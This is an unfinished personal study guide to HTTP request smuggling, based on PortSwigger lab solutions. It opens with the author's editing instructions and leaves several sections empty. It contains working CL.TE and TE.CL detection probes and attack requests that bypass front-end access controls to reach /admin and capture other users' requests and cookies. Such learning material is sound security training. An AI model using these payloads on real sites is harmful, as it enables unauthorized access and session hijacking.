---
created: 2026-06-15
status: slop
---

The most important objective: add explanations. This is not a cheat sheet (I will of course make a separate one later), so while reading this, the reader should understand EVERY BIT of what's going on to actually understand the attacks and the principles. Not just memorize the payloads and blindly throw them. Becoming a good ethical hacker and a bug bounty hunter means impressive understanding of how things work under the hood, and my guide aims to deliver the best explanations on HTTP request smuggling ever written before. Every statement, especially about sizes of different parts of requests and request results, should be explained. Existing explanations must also be made better. explain payloads/probes/requests.
Another important objective — COMPREHENSIVENESS. This guide must cover everything covered in the PortSwigger Web Security Academy (but with better explanations). Not missing a single topic.
So, detailed, comprehensive — and also make it sound fluent and natural in English.
You can modify headers, content, order, everything - to make this guide the best out there. But keep it informative.
also improve structure (uniform, easy-to-navigate)


I will also attach my lab solutions you can use to improve the methodologies.

Go through every and all request smuggling lab again
same with authentication attacks + cheat sheets


## CL.TE

- 4-step methodology:
	1. Pick an endpoint
	2. Prepare Burp `Repeater` for request smuggling
		1. Downgrade HTTP/2 to HTTP/1.1
		2. Change request method to `POST`
		3. Disable automatic update of `Content-Length`
		4. Show non-printable characters
	3. Detect the CL.TE vulnerability
	4. Confirm the CL.TE vulnerability

1. **Pick an endpoint**
	- In this lab, we target the root endpoint `/`. Send the request to `Repeater`.
2. **Prepare Burp `Repeater` for request smuggling**

## TE.CL

## HTTP Request smuggling in Repeater

1. **Downgrade HTTP/2 to HTTP/1.1**
	- In `Repeater`, go to `Inspector` -> `Request attributes` -> `Protocol`, then switch from `HTTP/2` to `HTTP/1`.

![[http1.1_downgrade.png]]

2. **Change request method to `POST`**
	- Right-click the request -> `Change request method`.

![[change_request_method.png]]

3. **Disable automatic update of `Content-Length`**
	- Go to `Repeater` settings, then uncheck `Update Content-Length`.

![[disable_length_update.png]]

4. **Show non-printable characters**
	- Click on the `\n` button in the top right corner of the request tab.

![[show_non-printable_characters.png]]

>[!tip] Optionally, for simplicity, you can remove unnecessary HTTP headers so the request is easier to work with.

- Send the request as a sanity-check to ensure that it is valid and the application responds normally.

## Detecting and confirming HRS vulnerabilities

### Detecting HRS using timing techniques

- First detection probe:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

3␍␊
ABC␍␊
X␍␊
```

>[!interesting]+ Analyzing results
> - **Response from the back-end -> `CL.CL`**
> - **Rejected by the front-end -> `TE.CL` or `TE.TE`** -> proceed to the next probe
> 	- The front-end server uses the `Transfer-Encoding: chunked` header to process the request. 
> 	- It reads the first chunk of `3` bytes (`ABC`), and then proceeds to the next one. But since `X` is an invalid hex number, the front-end rejects the request. 
> 	- The request never reaches the back-end.
>- **Timeout at the backend -> `CL.TE`**
> 	- The front-end server uses the `Content-Length` header to process the request. It reads exactly `6` bytes specified by the header and dispatches them to the back-end, dropping the final `X`.
> 	- The back-end uses `Transfer-Encoding: chunked`. It processes the first chunk and then waits for the next chunk until the timeout (since no `0` chunk was specified to mark the end of request). 
>
> ![[probe_1_CL.TE_timeout.png]]

- Second detection probe:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0␍␊
␍␊
X
```

>[!interesting]+ Analyzing results

![[detecting_HRS.svg]]

- If you suspect TE.TE (reject on the first probe and response from the back-end on the second), modify the second probe to add `Transfer-Encoding: chunked` obfuscation and send the request again:

```http
POST / HTTP/1.1
Host: 0acf0019030da4d2804cb23a00f500f6.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

0␍␊
␍␊
X
```

- Reject by front-end would mean `TE.TE` -> `TE.CL`, and timeout (socket poison) would mean `TE.TE` -> `CL.TE`.


### Confirming HTTP request smuggling using differential responses

- To confirm CL.TE HRS, send the following request twice:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0␍␊
␍␊
X
```

>[!note] Alternatively, use it as an attack request, sent right before a normal request. 
>- In this case, make your normal request as similar as possible to your attack request to increase the odds both are processed by the same back-end.

>[!interesting]- Analyzing results
>If the application is vulnerable to CL.TE HRS:
>- The front-end server uses the `Content-Length` header to process the request. It reads exactly `6` bytes specified by the header and dispatches them to the back-end, dropping the final `X`.
>- The front-end uses the `Transfer-Encoding: chunked` header to process the request. It reads the `0` chunk and considers the request complete.
>- The `X` left behind by the front-end is still in the buffer. It is appended to the next request the front-end server receives (so `POST` becomes `XPOST`). This modified request is sent to the back-end.
>- The back-end reads `XPOST` method and returns an error like `"Unrecognized method XPOST"` to your client.
>
>![[confirming_CL.TE.png]]

- To confirm TE.CL HRS, send the following request twice:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

1␍␊
X␍␊
0␍␊
␍␊
```

![[confirming_HRS.svg]]

## Exploiting request smuggling

### Modifying other HTTP requests

#### CL.TE

Smuggle a request that returns `/404`:

1. Attack request: 

```http
POST / HTTP/1.1
Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0␍␊
␍␊
GET /404 HTTP/1.1␍␊
X-Ignore: X
```

>[!note]+ Calculating request size
>`Content-Length` in the `POST` request should cover the whole body: from the first `0` to the last `X`, including CRLF (in `Repeater`, select the entire request body; `Inspector` will show the size of the selection in both decimal and hex).
>![[images/walkthrough/PortSwigger/HRS/lab1/2.png]]

2. Normal request:

```http
GET / HTTP/1.1
Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
```

>[!bug]+ Labs
>- [[🛠️ HTTP request smuggling labs#1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses]].

#### TE.CL

Smuggle a request that returns `/404`:

1. Attack request:

```http
POST / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9d␍␊
GET /404 HTTP/1.1␍␊
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net␍␊
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
␍␊
X=␍␊
0␍␊
␍␊
```

>[!note]+ Calculating request size
>- `Content-Length` in the `POST` request should be send to the size of the hex digits of the first chunk (usually `1` or `2`) + CRLF (`2` bytes).
>- The size of the first chunk itself should include everything inside the chunk, up to `0` (in Burp, select everything from `GET` up to `0`; `Inspector` will show the size in both decimal and hex, you need hex).
>
>![[images/walkthrough/PortSwigger/HRS/lab2/5.png]]
>- `Content-Length` in the smuggled request should be send to a large number (like `99`) to include parts of or the entire next request.

2. Normal request (first make sure it is valid alone):

```http
GET / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
```

### Bypassing front-end access controls

#### CL.TE


```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Transfer-Encoding: chunked

0␍␊
␍␊
GET /admin HTTP/1.1␍␊
Host: localhost␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 100␍␊
␍␊
x=
```


>[!bug]+ Labs 
>- [[🛠️ HTTP request smuggling labs#3. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability]]
#### TE.CL

- Attack request: 

```http
POST / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

39␍␊
GET /admin HTTP/1.1␍␊
Host: localhost␍␊
Content-Length: 6␍␊
␍␊
0␍␊
␍␊
```

- Normal request:

```http
GET / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net

```

>[!bug]+ Labs 
>- [[🛠️ HTTP request smuggling labs#14. HTTP request smuggling, basic TE.CL vulnerability]].
### Revealing front-end request rewriting

- In many applications, the front-end server is configured to rewrite client requests before they are forwarded to the backend, such as by introducing additional HTTP headers. 
- A front-end server might:
	- **TLS termination**: terminating TLS connection, adding headers describing the protocol and ciphers that were used, and forwarding the request via a plain-text connection to the back-end (used to off-load TLS tasks from back-end server's CPUs).
	- Add an `X-Forwarded-For` header specifying the user's IP address.
	- Determine the user's ID based on their session token and add a header identifying the user.
	- Add some sensitive information that is of interest for other attacks.
- There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to:

	1. Find a `POST` request that reflects the value of a request parameter into the application's response.
	2. Shuffle the parameters so that the reflected parameter appears last in the message body.
	3. Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

#### CL.TE

- Attack request:

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=test
```

- Normal request:

```http
GET / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net


```

>[!bug]+ Labs
>- [[🛠️ HTTP request smuggling labs#5. Exploiting HTTP request smuggling to reveal front-end request rewriting]]

#### TE.CL

### Capturing other users' requests


```http
POST / HTTP/1.1
Host: 0a72007603e8a25080fc3f57008f00c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 281
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=YC4SoKojJVixyv8JMoK9A4eR9sAAKtkX
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

csrf=VPS3XF2V4jVWsvefPcNkduR2vHsqVaGI&postId=5&name=name&email=email%40example.com&website=https%3A%2F%2Fexample.com&comment=
```

- In this case, other users' requests will be reflected in the comment section. 
- Increase the `Content-Length` of the smuggled request to see more.

## HTTP/2 request smuggling

## Smuggler

- https://github.com/defparam/smuggler.